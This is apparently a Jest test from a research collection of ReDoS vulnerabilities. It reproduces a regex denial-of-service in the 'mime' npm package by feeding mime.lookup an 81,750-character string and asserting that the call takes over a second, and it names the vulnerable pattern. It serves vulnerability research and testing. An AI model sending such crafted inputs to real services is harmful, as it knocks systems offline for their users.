//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-mime.js
test("ReDos in mime", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const mime = require('mime');

    let str =  genstr(81750, '5') + ""; //progblematic regex: /.*[\.\/\\]/, in mime.js

    let t = measureTime(function() {
        mime.lookup(str);
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});